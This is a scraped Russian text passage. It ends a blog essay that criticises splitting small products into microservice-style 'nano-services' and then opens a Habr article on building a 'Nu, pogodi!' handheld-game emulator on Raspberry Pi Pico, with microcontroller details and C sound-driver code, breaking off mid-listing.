пятьдесят... Для того, чтобы решить проблему «одного котла», была придумана cервис-ориентированная архитектура (SOA)SOA как ответ на проблему монолита.В теории SOA — это независимые специализированные сервисы, масштабируемые и управляемые.На практике же это сервисы, ведущие беспорядочные связи либо напрямую друг с другом, либо через корпоративную шину (ESB). Либо и так и этак. Да ещё в довесок часть бизнес-логики размазана по ESB.Питер Артсен «Сцена на рынке»По кулинарной аналогии, SOA превращается в развал разных продуктов. Всё перемешано, где что лежит — не понятно. Чтобы добраться до некоторых продуктов, приходится переворошить всю кучу. Владеть развалом — дорого. Поддерживать его работу — трудно. Если, к примеру, виноград скиснет, он испортит окружающие продукты. Тогда придется перебирать и перемывать все вокруг. Пример связи сервисов (очень скучный)Сервис вызывает хранимую процедуру в базе MS SQL.Процедура выполняет некоторые действия и через linked server вызывает другую процедуру на другом сервере.Другая процедура через SOAP (!) дергает ESB.ESB обрабатывает данные, и отправляет сообщение другому сервису.Другой сервис вызывает хранимую процедуру в первоначальной базе для выполнения бизнес-логики.Только представьте себе удовольствие разбирать инциденты в такой системе.SOA, которая казалась спасением от монолита, сама имеет ряд критических недостатков. У нее сложные связи: тронете один сервис — придется менять окружающие. Бизнес-логика размазана как по сервисам, так и по шине. Её трудно тестировать, и не менее трудно разворачивать. Все это привело к изобретению нового лекарства: микро-сервисной архитектуры (MSA).Микро-сервисы — ответ на проблемы SOA.Микро-сервис — это некий независимо разрабатываемый и развертываемый сервис. Он изолированный и масштабируемый. Он решает конкретную бизнес-задачу. Каждый микро-сервис имеет свой ограниченный контекст и общается через стандартизированный API.Возможно, ваше определение микро-сервиса будет иным. Это весьма «холиварная» тема. К примеру, в этой статье приведен целый спектр определений от уважаемых людей. Давайте дадим определение микро-сервису через аналогию: микро-сервис — как блюдо. Про него можно сказать следующее:Блюдо изолировано: каждое находится в свой тарелке. Или, если хотите, в контейнере. Блюда имеют ограниченный контекст. Плов — это плов, его не мешают с фруктами. Потребитель получает то, за что платит по меню. Блюда слабо связаны между собой. После тарелки любого супа можно взять любой гарнир. А можно и не брать. Бывают, конечно, ограничения: не стоит запивать селедку молоком. Но это — исключение.Блюда масштабируются. Мало одной котлеты — можно съесть две.Блюда легко тестируются. Их можно дегустировать по-отдельности.Блюда индивидуально конфигурируются. Можно взять борщ с пампушкой, можно — без. По описанию получилось вполне съедобно, не так ли? Так почему же внедрение микро-сервисов так редко заканчивается успехом? Я не буду разглагольствовать про неверное разграничение контекста и другие пороки. Про них и так много сказано. Сфокусируюсь на одном.Корень проблемы — неверная область использования микро-сервисов.Микро-сервисы применяются не там и не так.Микро-сервисы задумывались как альтернатива монолиту, который пилят десятки разработчиков. А сейчас все работают по Agile, команды маленькие. Работают или над своим небольшим продуктом, или над частью общего продукта компании.  Продукт (часть продукта) уже имеет изолированный контекст и слабые зависимости. С другими продуктами (частями) общается по API. Имеет свой технологический стек. Владеет отдельным хранилищем (базой). Независимо разворачивается. И даже имеет свою команду «на две пиццы». По совокупности признаков, он уже микро-сервис! Продукт является готовым блюдом для потребителей. Так же, как этот салатик:Источник: russianfood.comНо нет! Каждая команда считает свой салатик монолитом. И поэтому берет, и делит на микро-сервисы. Что же у нее получается в итоге? Правильно: нано-сервисы!Вместо того чтобы смешать все ингредиенты и приготовить блюдо, команда любовно расфасовывает ингредиенты по контейнерам. Но все-таки салат — это не то же самое, что запчасти для салата.Источник: russianfood.comЕсли вам вместо трех блюд подадут тридцать ингредиентов в отдельных тарелочках, думаю, вы вряд ли посчитаете это хорошим обслуживанием.UP: Пример моей ошибки в приготовлении микро-сервисовЗадача: Реализовать печать электронных чеков для клиентов. Вводные: Данные о чеках хранятся в Бэк Офисе. Сами мы печатать не умеем, да и железа нет. Будем печатать при помощи операторов (контрагентов), например, ""Атол"". Нам надо получать данные из Бэка, обработать нужным образом, отправить оператору. Главное — корректно обработать ошибки операторов, не допустить дубликатов, и ничего не потерять, иначе придёт очень злая бухгалтерия.Изначальная архитектура:Предлагалась классическая гексагональная архитектура. Адаптер из Бэка читает данные о чеках и записывает обновления. Адаптеры к Atol, Ferma и к другим операторам (не реклама) по HTTP отправляют чеки на печать и получают результаты. Бизнес-логика управляет куда и с какой скоростью слать чеки.Алгоритм:Сервис при помощи адаптера получает из Бэк Офиса данные о чеках. При получении в той же транзакции заносит информацию, какому оператору будет назначен тот или иной чек + ключ идемпотентности.Сервис преобразует данные, формирует в памяти очереди для каждого оператораСервис отправляет чеки на печать в онлайн-кассы через адаптеры Сервис получает callback от онлайн-касс и записывает в Бэк Офис данные о распечатанных чеках.Если сервис падает - ничего страшного. Поднимется, повторно пошлет все ""подвисшие"" чеки нужным операторам. Операторы не допустят дубликатов чеков, ориентируюсь на ключ идемпотентности.По факту, это и был бы настоящий микро-сервис между Бэк Офисом и операторами.Изменение архитектуры.Из-за очень настойчивого мнения руководителя (на прошлой работе) принято решение писать на ""микро-сервисах"" в его понимании. Поэтому, архитектура преобразовалась в такую:То есть, стала уже не микро-сервисной, а нано-сервисной.Почему нано? Потому, что они реально маленькие. На разработку я в одиночку потратил 5 недель. Каждый нано-сервис занимается своей нано-задачей. Бизнес-задачу нано-сервисы могут выполнить лишь сообща.Заметка: GRPC между ""микро-сервисов"" выбран потому, что Кафку в компанию еще не завезли, а от старой шины уже решили отказываться. Не бейте меня, это вынужденная мера.Полученные минусы:Х2 трудозатрат на реализацию. Потому что оверхед на взаимодействие между сервисами. Просто нужно написать больше обслуживающего кода. Нужно выстраивать потоки данных, нужно думать о том, что делать, если данные потеряются, если не все сервисы будут доступны и т.д.Х3 затрат на поддержку. Потому что вместо одного микро-сервиса получили ряд нано-сервисов. С алертингом, мониторингом, трейсингом, логами. Все это надо настраивать, хостить, поддерживать. И разбирать инциденты от бухгалтерии вида: ""вы опять чек пролюбили""Излишне заложенная гибкость и масштабирование. То есть излишние потраченные деньги. Постоянно быть онлайн не нужно. Если покупатель получит чек на несколько часов позже - это вообще некритично по мнению бизнес-заказчика. Горизонтальное масштабирование совсем не нужно. В пике сервисы кушали пару сотен мб оперативки и 10% ядра процессора. Узкое место - скорость онлайн касс, а не сервисов.Вывод: получились нано-сервисы с завышенной стоимостью владения.Рассмотрим всю IT-иерархию в нашей ресторанной терминологии. Допустим, вы хозяин ресторана. Хорошее обслуживание может получиться, если Каждое блюдо — это блюдо, а не набор ингредиентов в контейнерах. То есть — микро-сервис, а не куча нано-сервисов. Есть еще общая солонка, перечница и салфетница. Это — инфраструктурные микро-сервисы. Солонка в тарелке — так себе решение. Не надо их тащить в свой продукт.У каждого гостя есть свой стул, место за столом, приборы, и несколько блюд.  Получаются железо плюс софт, составляющие информационную систему (ИС).У компании гостей есть свой стол, за которым они сидят и едят. Все это образует домен.Ну а все, что находится внутри ресторана, то есть совокупность всех этих доменов, формирует корпоративный IT-ландшафт.Да простят меня корпоративные архитекторы за такую интерпретацию!Готовьте микро-сервисы правильно.Многие компании целиком поражены болезнью чрезмерной декомпозиции. То и дело говорят: «у нас 30 команд и 1500+ микро-сервисов». И ведь искренне еще гордятся этим! Забывая рассказать про свои затраты на инфраструктуру. Рассказать, что новый разработчик до полугода погружается в эти сервисы. Что локализация обычного бага занимает у него неделю.После всего сказанного позволю себе один совет: Не дробите ваш маленький продукт на нано-сервисы. Это его убьёт.Он хороший. Дайте ему шанс повзрослеть."
89,"Создаём эмулятор легендарной игры «Ну, Погоди» на базе Raspberry Pi Pico",RUVDS.com,VDS/VPS-хостинг. Скидка 15% по коду HABR15,0,"Связь и телекоммуникации, Домены и хостинг, Веб-сервисы",2025-04-09,"  Многие из тех, кому сейчас за 30, и рождённых в СССР или на постсоветском пространстве, помнят электронную игру «Ну, погоди!». Во времена, когда не было ни интернета, ни ноутбуков, ни мобильных телефонов, а из общедоступных электронных развлечений были только аттракционы в парках культуры и видеосалоны, обладание бытовым компьютером, электронными наручными часами Montana или электронной игрой «Ну, погоди!» было мечтой многих детей.  Были ещё и другие электронные игры, но именно «Ну, погоди!» считается классикой. Игре посвящено много ностальгических статей и видео. На различных торговых площадках можно купить её в различном состоянии от убитого до «с хранения» и даже новодел. Лет 10 назад и я купил её в идеальном состоянии, поигрался, вспомнил детство и положил в ящик. Но несколько месяцев назад с разочарованием увидел, что «потекла» нижняя часть экрана. Можно было или отремонтировать, или купить другой экземпляр игры, но я сначала попробовал узнать, как её отремонтировать, а потом решил воссоздать игру на современных компонентах. Я не был одинок в своём желании воссоздать игру, этой теме посвящено также немало статей, но в них обычно создавали симуляторы, а не эмуляторы игры. Симулятор у меня ассоциируется с фразой: «Я художник, я так вижу», эмулятор — это более точное воспроизведение устройства. Формат статьи не позволяет выразить все те ощущения, которые я испытал при путешествии от зарождения идеи до реально работающей игры, практически ничем не отличающейся от оригинала. Много из того, что я узнал в этом путешествии, не поместилось в статью или поместилось в очень сжатом виде. Эмулятор максимально приближен к оригиналу, если не считать экран (он не сегментный, как в оригинале) и корпус (я пока реализовал на беспаечной макетной плате). Если вам интересно, как за несколько вечеров воссоздать у себя эмулятор «Ну, погоди!» на современном микроконтроллере или просто поностальгировать, добро пожаловать под кат. Немного истории Я не застал СССР во взрослом возрасте, но по той информации, что сейчас можно найти в интернете, из-за политической ситуации в мире советская электроника 80-х годов была смесью пиратства, реверс-инжиниринга, уникальных разработок и попыток интегрироваться в мировую экономику. Всё это в полной мере отразилось в электронной игре «Ну, погоди!». Японская компания Nintendo 9 октября 1981 выпустила две игры из серии Game & Watch Wide Screen, идентичные по геймплею, но из-за лицензионных ограничений отличающиеся по оформлению: Egg и Mickey Mouse. Советский союз не остался в стороне и выпустил клон — «Электроника 24-01. Игра на экране: Микки Маус». Но самой известной игрой, выпущенной в СССР, стала «Электроника ИМ-02» — «Ну, погоди!». Game & Watch MC-25 «Mickey Mouse»  Game & Watch EG-26 «Egg»  Электроника 24-01 «Игра на экране: Микки Маус»  Электроника ИМ-02 «Ну, погоди!»  Позже были выпущены различные советские клоны линейки Game & Watch, но некоторые игры из линейки Электроника ИМ, например, Электроника ИМ-23 «Автослалом» 1989 года является уникальной и не имеет японского аналога. При желании можно найти много общей информации по советским и японским играм, но я, чтобы не распыляться, сосредоточусь только на «Ну, погоди!». Интересно, но советский бренд «Электроника» вообще не говорил о том, где сделали то или иное устройство. Устройство могли выпускать на нескольких заводах в разных советских республиках. И, несмотря на повальную стандартизацию и унификацию, часто устройства отличались в зависимости от того, на каком заводе были выпущены. Введение  Расскажу, как мне пришла идея своего эмулятора, и с чем мне пришлось столкнуться. Я спаял Мурмулятор и успел насладиться спектрумовскими играми на нём. Мне очень понравилась идея создания эмулятора на микроконтроллере без операционной системы, уж очень быстро устройство готово к работе и очень реалистично эмулирует. Я задался вопросом, а можно ли подобный эмулятор создать для «Ну, погоди!». Итак, мой первый поисковый запрос был «Эмулятор Ну, Погоди!», который привёл на тему форума. Очень много информации было почерпнуто при просмотре сообщений этой темы, а также темы форума на сайте watch.ru. Для меня задача решается проще, когда ты уверен в возможности её решения. И в том, что решение задачи возможно, меня убедил отладчик для игр серии Электроника и наличие уже существующих эмуляторов. Отладчик помог мне и в изучении того, как работает игра на низком уровне. У него небольшой размер, но он очень функциональный. Я понял это, когда перерыл уйму информации и написал свой эмулятор. Кроме непосредственной отладки, в нём вы можете посмотреть распиновку микроконтроллеров, разводку сегментов дисплея, получить звук игры в виде wav-файла. Для работы с эмулятором необходимо найти ROM нужной вам игры. Внешний вид отладчика  Так как игра была создана ещё в 80-х годах, очень мало информации об используемом микроконтроллере, иногда информация противоречивая, и её нужно было буквально по крупицам собирать и перепроверять. Но в целом полученным результатом я доволен. Кроме 2 тем на форумах и отладчика, я использовал:  Код эмулятора MAME для устройств SM-510. Документацию по микроконтроллерам Sharp (ссылка 1 и ссылка 2). Cтатья «Однокристальные ЭВМ серии КБ1013» в журнале «Микропроцессорные средства и системы» 1987г. №5 стр. 5-18. Ссылка на журнал. Статьи IgorR76 по микроконтроллеру КБ1013ВК1-2 (Статья 1 и Статья 2). Различные схемы для игры «Ну, погоди!», которые я сумел найти на форумах. Несколько проектов, помимо MAME, связанных с эмуляцией, на Github:  LCD Game Emulator, LCD Game Shrinker, CPU-SM5A-cpp, game-and-watch-retro-go.  Урок по жидким кристаллам от Павла Виктора, который доходчиво рассказал, что такое жидкокристаллический дисплей, и как он работает. Были бы такие уроки по физике в моей школе. Лекции по Raspberry Pi Pico, так как я не был знаком c Raspberry Pi Pico. В частности лекция по PIO. Беседы с ИИ-помощником, без него сейчас уже никуда. Только часть времени тратится на проверку его утверждений, соглашательство его очень мешает.  Может, кому-то моя статья покажется простой и банальной, но, во-первых, в простоте истина и красота, в простом быстрее разобраться, а, во-вторых, простое всегда можно развить во что-то более сложное и полезное. Как устроена «Ну, погоди»  С внутренним устройством игры я ознакомился в детстве, когда решил разобрать свою «Ну, погоди!», у которой перестали светиться отдельные сегменты экрана. Естественно, такого вандализма игра не пережила и ещё несколько лет пылилась в ящике для игрушек, пока её не выбросили при очередной разборке ящика. Основу игры составляют:  печатная плата, две токопроводящие резинки, сегментный жидкокристаллический дисплей ИЖМ2-71-01 или ИЖМ13-71, поляризационный фильтр, светоотражающая поляризационная плёнка, плёнка с сюжетом, мембраны для кнопок, кнопки, корпус игры из двух половинок, крышка для отсека батареек, две батарейки, десяток шурупов.  На печатной плате находятся:  микроконтроллер КБ1013ВК1-2, или, как тогда принято было называть, однокристальная микроЭВМ пьезоизлучателель, «часовой» кварц на 32768 Гц, несколько конденсаторов, батарейный отсек, контакты для мембранных кнопок, контакты для токопроводящих резинок, передающих сигналы от печатной платы жидкокристаллическому дисплею.  Внешний вид однокристальной микроЭВМ КБ1013ВК1-2  В детстве меня больше всего меня впечатлили токопроводящие резинки, соединяющие плату и сегментный индикатор. Зная из физики, что резина не проводит электричество, я не мог понять, как сигналы передаются на экран. Если резинка проводящая, то как она не замыкает все контакты? Сейчас я знаю, что токопроводящая резинка — композитный материал, который состоит из тонких чередующихся слоёв (проводника и изолятора). Больше информации вы можете узнать из познавательного видео о внутреннем устройстве игр серии Электроника ИМ. Приведу интересные факты, которые помогут вам быстрее вникнуть в то, что нужно для создания эмулятора. К сожалению, на 100% быть уверенным в достоверности информации я не могу, так как официальных источников информации практически нет. Но тем не менее, то, что я собрал, позволило мне создать работающий эмулятор «Ну, погоди!» на базе Raspberry Pi Pico.  КБ1013ВК1-2 является советским аналогом японского Sharp SM-5A. Полноценной спецификации для КБ1013ВК1-2 и Sharp SM-5A я не нашёл, но есть несколько источников, которые позволяют разобраться в их работе. Мнемоники ассемблера, название регистров портов ввода-вывода для КБ1013ВК1-2 и Sharp SM-5A различные, но микроконтроллеры имеют идентичную архитектуру и бинарно совместимы. Для КБ1013ВК1-2 многое проясняют несколько статей в журнале «Микропроцессорные средства и системы». Микроконтроллер Sharp SM-5A задокументирован ещё меньше. Он является одним из серии микроконтроллеров, выпускавшихся Sharp. Для Sharp SM-5A описание инструкций я не нашёл, в источнике 1 присутствует только общая информация о нём, а в источнике 2 описание мнемомоник схожего с SM-5A микроконтроллера SM-510. Много информации можно получить из эмулятора SM-510 проекта MAME, а также более простых эмуляторов. Микроконтроллеры имеют масочное ПЗУ, записанное один раз и навсегда на заводе. То есть изменить программу для игры в микроконтроллере нельзя. Как было получено содержимое ПЗУ для игр, гуляющее на просторах интернета, существует несколько вариантов:  методом декапинга, переводом микроконтроллера в специальный режим, у Nintendo могли сохраниться исходные прошивки, так как я находил файлы, датируемые 1996 годом, а информация о двух первых способах появилась гораздо позже.  Обладание прошивкой вовсе не значит, что вы её сможете просто так взять и выполнить инструкция за инструкцией, так как у этих микроконтроллеров используется так называемый полиномиальный счётчик команд. Игра «Ну, погоди!» не использует возможности сегментного дешифратора.  Построение эмулятора для микроконтроллера является задачей проще, чем кажется на первый взгляд. Важно немного по-другому глянуть на проблему, как говорят, подобрать метафору. Мне помогло, когда я посмотрел на микроконтроллер с точки зрения ООП. Микроконтроллер хранит состояние в своих регистрах, каждая команда имеет интерфейс в виде машинного кода и реализацию в виде микрокода, который изменяет состояние микроконтроллера. Для эмулятора более сложных микроконтроллеров, вероятно, эта метафора не подойдёт, но для КБ1013ВК1-2 сгодится. Естественно, метафоры недостаточно. Чтобы написать эмулятор для конкретного микроконтроллера, нужна следующая информация: об архитектуре, регистрах, устройстве ПЗУ и ОЗУ, возможностях ввода-вывода, наборе поддерживаемых команд и их семантике, ну и, естественно, понимание принципов написания эмулятора. Микроконтроллеры КБ1013ВК1-2/SM-5A  Для построения эмулятора игры «Ну, погоди!» важной составляющей является разработка эмулятора самого микроконтроллера (однокристальной микроЭВМ). Важно знать программную модель микроконтроллера, но знание архитектуры микроконтроллера поможет лучше понять программную модель. Структура и стиль изложения в статье «Однокристальные ЭВМ серии КБ1013» в журнале «Микропроцессорные средства и системы» оставляет желать лучшего, но эта статья является, пожалуй, самым полным общедоступным трудом, который задокументировал КБ1013ВК1-2. К сожалению, в ней программная модель описана вперемешку с описанием архитектуры, что только запутывает. Далее я хочу преподнести информацию, на мой взгляд, более доходчиво. Надеюсь, мне это удастся. ▍ Архитектура микроконтроллеров КБ1013ВК1-2/SM-5A  Микроконтроллер имеет гарвардскую архитектуру, что подразумевает отдельные шины адреса для памяти программ и для памяти данных. Построение эмуляторов для микроконтроллеров с гарвардской архитектурой немного проще. Микроконтроллер в СССР называли однокристальной микроЭВМ, и я считаю, что этот термин лучше отражает архитектуру этого устройства. У однокристальной микроЭВМ есть процессор, обрабатывающий команды, ПЗУ, ОЗУ, набор схем для коммутации с внешними устройствами. В однокристальной микроЭВМ КБ1013ВК1-2 это всё присутствовало. Знал бы я в детстве, что я был обладателем полноценной ЭВМ! Из устройств у КБ1013ВК1-2 присутствуют:  процессор, таймер, контроллер жидкокристаллических дисплеев, дешифратор сегментного кода, устройство управления режимом малой потребляемой мощности (считай спящим режимом).  Для эмуляции нам важны первые три. Замечу, что дешифратор сегментного кода вообще не используется программой, записанной в «Ну, погоди!», но в эмулятор я его всё равно включил. Есть ещё другие устройства, но думаю, это уже тема более глубокого исследования. Структурные схемы для SM5A и КБ1013ВК1-2 приведены ниже: Распиновка SM5A  Схема SM5A  Схема КБ1013ВК1-2  Обозначение микросхемы КБ1013ВК1-2 на чертежах  Распиновка микросхемы КБ1013ВК1-2 в 60-ти выводном планарном корпусе  SM5A выпускался в 60QFP корпусе, КБ1013ВК1-2 в похожем на него планарном 60 выводном корпусе. Как я понимаю, микроконтроллеры не были совместимы по расположению выводов, но совместимы на уровне машинных кодов и присутствующих устройств ввода-вывода. Я не рассчитываю, что вы сразу поймёте эти схемы, но для общего понимания микроконтроллера КБ1013ВК1-2/SM5A, если к ним добавить программную модель, будет достаточно. ▍ Программная модель микроконтроллеров КБ1013ВК1-2/SM-5A  На основании доступной мне информации я могу предположить, что программная модель SM-5A идентична КБ1013ВК1-2. Различаются они только названиями регистров, портов ввода-вывода и мнемоник машинных команд.    Элемент модели  КБ1013ВК1-2  SM-5A  Кол-во разрядов    Аккумулятор  Acc  Acc  4    Флаг переноса  C  C  1    Счётчик команд  PC  СA, PU, PL  11 (1, 4 и 6)    Стековый регистр  A  S (CS, SU, SL)  11 (1, 4 и 6)    Регистр доступа к ОЗУ  DP (DPH, DPL)  B (BM, BL)  7 (3 и 4)    Порт ввода  D  K  4    Порт вывода  R  R  4    Порт вывода для контроллера ЖК-дисплея  O,O’  W,W’  36 и 36    Таймер  T  DIV  15(4)    Флаг таймера  TIMER  не нашёл информации  1    Флаг прерывания 1  INT1  α  1    Флаг прерывания 2  INT2  β  1    Интересно реализованы прерывания в КБ1013ВК1-2. Вместо привычной push-модели используется pull-модель. Иными словами, прерывание не является событием, которое прерывает выполнение основной программы для вызова обработчика прерывания, а программа должна опросить флаг прерывания, и, если он установлен, выполнить обработку. Push-модель реализована только при выходе микроконтроллера из спящего режима при переполнении счётчика или наличия информации во входном порту. В этом случае микроконтроллер выполняет переход по адресу 0х0000. Но я не знаю, можно ли это отнести к механизму прерываний. Для флагов прерывания α и β я сомневаюсь, что японцы использовали в мнемониках греческие буквы, но как они назывались в мнемониках, я не нашёл. ▍ ПЗУ, ОЗУ, ввод-вывод  Организация ПЗУ, у привыкших к современным микроконтроллерам, наверное, вызовет недоумение. ПЗУ имеет страничную организацию. В ПЗУ хранится программа. Счётчик команд PC и стековый регистр A хранят адреса в памяти ПЗУ. К тому же PC явлется полиномиальным счётчиком (то есть он изменяется не на 1 при икрементировании). В общем, я взял готовый код из MAME для полиномиального счётчика. Организация ОЗУ тоже вызывает удивление, но то были времена, когда 64 килобайт должно было хватить всем. В ОЗУ хранятся данные. Адресуются не байты, а ниблы, или полубайты (4 бита). Возможности ввода-вывода игрой «Ну, погоди!» используются не полностью. Скажу только, что регистр для ввода данных и регистр для вывода данных используются для организации матричной клавиатуры. Вы поймёте, как она организована, изучив распиновку микроконтроллера и схему электрическую принципиальную «Ну, погоди!». Доступ к таймеру и регистрам порта ввода-вывода ЖКИ ограниченный. Вы не можете получить из программы доступ ко всем битам таймера, как и вывода для контроллера ЖК-дисплея. Таймер является 15-битным, но из программы можно только манипулировать переполнением и старшими 4 битами. В регистры контроллера ЖКИ данные помещаются по очереди в один регистр со сдвигом, а также есть возможность группу регистров O(W) поместить в O’(W’). Как всё реализовано — лучше посмотреть на исходный код в MAME или в моём эмуляторе. ▍ Система команд  Система команд состоит из 58 базовых команд. Почти все команды имеют длину в 1 байт. Мнемоники ассемблера, как и названия регистров для SM-5A и КБ1013ВК1-2, имеют разные имена, что немного усложняет понимание. Полноценное описание мнемоник для SM5A, в отличие от КБ1013ВК1-2 я не нашёл. Но для создания эмулятора мне хватило программного кода в MAME. ▍ ЖКИ-дисплей игр серии Электроника ИМ  Я включил этот раздел в статью, поскольку в нём есть ответ на ворос, который долго не давал мне покоя: почему сегмент дисплея темнеет при подаче напряжения, остаётся светлым при отсутствии напряжения, но при вытекании жидких кристаллов повреждённый участок тоже становится тёмным? Сегментный ЖКИ-дисплей представляет собой многослойную конструкцию: поляризационный фильтр, две стеклянные пластины с нанесённым рисунком сегментов из прозрачного токопроводящего материала, тонкий слой жидких кристаллов и светоотражающая плёнка с поляризационным эффектом. Поляризационный фильтр и светоотражающая плёнка поляризуют свет в перпендикулярных направлениях. Если убрать стёкла с жидкими кристаллами, свет не пройдёт, и вы увидите тёмную область. Экран «Ну, погоди!»  Рисунок на лицевой стороне тыльного стекла ЖКИ-дисплея «Ну, Погоди!»  Рисунок на тыльной стороне лицевого стекла ЖКИ дисплея «Ну, Погоди!»  Лицевое стекло слегка выступает за края, обеспечивая контакт с печатной платой через токопроводящие резиновые прокладки. На токопроводящий слой тыльного стекла ток подаётся через небольшие токопроводящие мостики между стёклами. Между пластинами находится слой жидких кристаллов. Поляризационные плёнки с внешних сторон стёкол пропускают световые волны определённой полярности, формируя изображение. Как же свет проходит, когда на ЖКИ-дисплей не подаётся напряжение? На внутренние поверхности стёкол, помимо токопроводящего рисунка, нанесены параллельные борозды, причём борозды на одной пластине перпендикулярны бороздам на другой. Благодаря этим бороздам жидкие кристаллы выстраиваются в спиральные структуры при осутствии электрического поля, позволяя проходить свету. При подаче напряжения электрическое поле выравнивает кристаллы, нарушая спираль, и свет перестаёт проходить — сегмент темнеет. Схематично это представлено у 7-сегментного ЖКИ на рисунке ниже. Устройство ЖКИ-дисплея «Ну, Погоди» аналогично. Устройство ЖКИ-дислпея  Жидкие кристаллы деградируют при постоянном напряжении, поэтому на токопроводящий слой подаётся переменное напряжение. Эту задачу выполняет драйвер ЖКИ, например, встроенный в микросхему КБ1013ВК1-2. Кроме того, выводов у ЖКИ меньше, чем сегментов. Для управления используются общие выводы, каждый из которых активирует определённую группу сегментов в заданный момент. Поочерёдная активация этих выводов — ещё одна функция драйвера. Интересно было бы использовать оригинальный ЖКИ-дисплей из игры «Ну, погоди!». Это возможно в теории, но требует глубоких знаний электроники. Поэтому я остановился на модульном TFT-дисплее с драйвером ILI9341, популярном в DIY-проектах и более простом в реализации. Отказ от полной эмуляции работы драйвера ЖКИ значительно упрощает задачу. ▍ Схема электрическая принципиальная «Ну, погоди!»  Для лучшего понимания программного кода и схемы моего эмулятора, приведу схему оригинальной «Ну, погоди!» и распиновку КБ1013ВК1-2. Схема игры «Ну, погоди!»  Распиновка ЖКИ-дисплея «Ну, Погоди!»  Построение эмулятора  ▍ Принципы построения эмулятора  Я не претендую, что моё решение единственное и правильное, но оно является рабочим, по крайней мере, для описываемого эмулятора в статье. Создание эмулятора подразумевает, что вы знакомы с основами архитектуры компьютеров и компьютерной схемотехники. Из-за того, что микроконтроллер простой, разработка эмулятора для него можно считать тривиальная задача. Постараюсь в несколько абзацев вместить краткие сведения по архитектуре и схемотехнике. Микроконтроллер/процессор работает на определённой частоте. Под частотой понимается количество тактовых импульсов (тактов) в секунду. Такты необходимы для синхронизации работы процессора с внутренними схемами и внешними устройствами. Время, которое занимает обработка одной команды, называется командным циклом. Командный цикл состоит из трёх этапов: Fеtch — Decode — Execute. Этапы инициируются тактовыми сигналами. Этапы Fetch — Decode могут выполняться за один машинный такт. Наш микроконтроллер является простым, и почти все команды, кроме нескольких, имеют длину один байт. Командный цикл занимает два такта, а для команд из двух байт — четыре такта. Для эмуляции работы микропроцессора необходимо:  Реализовать работу с памятью программ. Реализовать работу с памятью данных. Написать логику работы каждой из команд. Написать логику для Fetch — Decode — Execute.  В рабочем состоянии процессор обычно выполняет Fetch — Decode — Execute в вечном цикле. В моём эмуляторе Fetch — Decode — Execute выглядит следущим образом: void device_run() {   int remaining_icount = m_icount;    while (m_icount > 0) {     m_icount--;      if (m_halt && !wake_me_up()) {       div_timer(remaining_icount);       m_icount = 0;       return;     }      m_prev_op = m_op;     m_prev_pc = m_pc;     m_op = read_byte_program(m_pc);      increment_pc();     get_opcode_param();      if (m_skip) {       m_skip = false;       m_op = 0;     } else       execute_one();      div_timer(remaining_icount - m_icount);     remaining_icount = m_icount;   } }  ▍ Эмуляция ЖКИ дисплея  Суть эмуляции заключается в следующем: изображение разбивается на зоны, соответствующие сегментам на сегментном дисплее, и, в зависимости от состояния регистров порта O (W) драйвера ЖКИ, отображаются или нет. Кроме того, при эмуляции отображается изображение с сюжетной плёнки. В интернете вместе с прошивкой для «Ну, погоди!» можно найти изображение со всеми сегментами и изображение с сюжетной плёнкой. Называется она ArtWork. К сожалению, именно для «Ну, погоди!» я не нашёл, а воспользовался той, которая была для Egg. Если вы присмотритесь, то сможете увидеть, что она наложилась неидеально, но, по-моему, это добавляет реалистичности в эмуляцию. Соотношения сторон и размеры TFT-дисплея и сегментного дисплея немного различаются, но я не стал добиваться 100% соответствия. Графические изображения необходимо предварительно обработать для использования в моём эмуляторе. В этом мне помог проект на Github. Как я понимаю, он используется для микроконтроллера или платы с лучшими характеристиками, чем Raspberry Pi Pico. Для использования с Pico и моим дисплеем я немного модифицировал программу из проекта. Я не использовал упаковку в архив. Так как размер оперативной памяти Pico не позволял разместить и кадровый буфер для вывода изображения, и распаковать архив, я разместил все данные в ПЗУ без архивации. Код для эмуляции ЖКИ я взял из проекта, удалив лишний код и адаптировав под мой TFT-дисплей. В реальном «Ну, погоди!» экран обновляется 60 раз в секунду. Добиться такого на Pico у меня не удалось, но «на глаз» изображение отображается удовлетворительно. Так как игра «Ну, погоди!» использует инертность сегментного ЖКИ-дисплея, в эмулятор пришлось добавить код для устранения мерцания. ▍ Эмуляция звука  Самым сложным для меня оказалось создание реалистичного звука, как в оригинальной игре, и синхронизация его с отображением на экране. Решение своё я не считаю идеальным, но результатом я доволен. В «Ну, погоди!» простейший однобитный звук, такой, какой был в то время. Заключался он в аппроксимации меандром. Вывод 0 и 1 в разряд порта, к которому подключён пьезоизлучатель, заставляет выдавать динамик нужные колебания. Задача, которая стояла передо мной, была выводить эти 0 и 1 с чёткими таймингами, такими же как и в оригинале. Изначально я хотел это сделать с использованием ШИМ, но потом узнал об интересной возможности PIO в Pico и решил использовать её. Если кратко, то PIO немного напоминает FPGA на минималках. Ниже я привожу листинги модуля для вывода звука и программу для PIO State Machine  Вывод звука #include ""sound.h"" #include ""def.h"" #include ""hardware/pio.h"" #include ""sound.pio.h"" #include <stdio.h>  #include ""hardware/dma.h""  volatile uint8_t *current_buff;  uint8_t buffer1[SOUND_BUFFER_SIZE] __attribute__((aligned(SOUND_BUFFER_SIZE))); uint8_t buffer2[SOUND_BUFFER_SIZE] __attribute__((aligned(SOUND_BUFFER_SIZE)));  #define PIO_TX_PIN 15  int dma_chan1; int dma_chan2;  volatile bool emulate = false; volatile bool draw = false;  volatile uint8 *buffer_start = buffer1;  void dma_handler() {   static uint32 cnt = 0;   if (dma_hw->ints0 & 1u << dma_chan1) {     // Clear the interrupt request.     dma_hw->ints0 = 1u << dma_chan1;     emulate = true;     buffer_start = buffer2;     if (!(cnt++ % 8)) {       draw = true;     }   } else if (dma_hw->ints0 & 1u << dma_chan2) {     dma_hw->ints0 = 1u << dma_chan2;     emulate = true;     buffer_start = buffer1;     if (!(cnt++ % 8)) {       draw = true;     }   } }  int init_sound() {    const uint sm = 0;    uint offset = pio_add_program(pio0, &beeper_tx_program);    beeper_tx_program_init(pio0, sm, offset, PIO_TX_PIN, SYS_FREQ);    dma_chan1 = dma_claim_unused_channel(true);   dma_chan2 = dma_claim_unused_channel(true);    dma_channel_config c1 = dma_channel_get_default_config(dma_chan1);   channel_config_set_transfer_data_size(&c1, DMA_SIZE_8);   channel_config_set_read_increment(&c1, true);   channel_config_set_write_increment(&c1, false);   channel_config_set_dreq(&c1, DREQ_PIO0_TX0);   channel_config_set_ring(&c1, false, 8);   channel_config_set_chain_to(&c1, dma_chan2);   dma_channel_set_irq0_enabled(dma_chan1, true);   dma_channel_configure(dma_chan1, &c1, &pio0_hw->txf[0], buffer1,                         SOUND_BUFFER_SIZE, false);   